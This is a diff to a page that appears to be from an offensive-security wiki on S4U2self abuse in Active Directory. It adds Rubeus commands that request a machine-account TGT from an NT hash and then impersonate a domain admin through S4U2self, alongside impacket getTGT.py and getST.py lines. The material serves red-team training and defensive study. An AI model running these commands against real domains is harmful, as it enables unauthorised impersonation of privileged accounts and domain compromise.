@@ -1,4 +1,4 @@
-# 🛠️ S4U2self abuse
+# S4U2self abuse
 
 ## Theory
 
@@ -36,10 +36,10 @@ getTGT.py -dc-ip "domaincontroller" -hashes :"NThash" "domain"/"machine$"
 {% endtab %}
 
 {% tab title="Windows" %}
-From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose
+From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose. Howerver, this step is optional if Rubeus is to be used later on for the S4U2self. In this case, with the appropriate arguments, Rubeus will request a TGT automatically.
 
 ```powershell
-//TODO
+.\Rubeus.exe asktgt /nowrap /domain:"domain" /user:"computer$" /rc4:"NThash"
 ```
 {% endtab %}
 {% endtabs %}
@@ -59,10 +59,16 @@ getST.py -self -impersonate 'DomainAdmin' -spn 'host/machine.domain.local' -k -n
 {% endtab %}
 
 {% tab title="Windows" %}
-From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose
+From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose.
 
 ```powershell
 .\Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /ticket:"base64ticket"
+```
+
+Rubeus can also be used to obtain a TGT automatically instead of supplying the `/ticket` argument.
+
+```powershell
+.\Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /domain:"domain" /user:"computer$" /rc4:"NThash"
 ```
 {% endtab %}
 {% endtabs %}
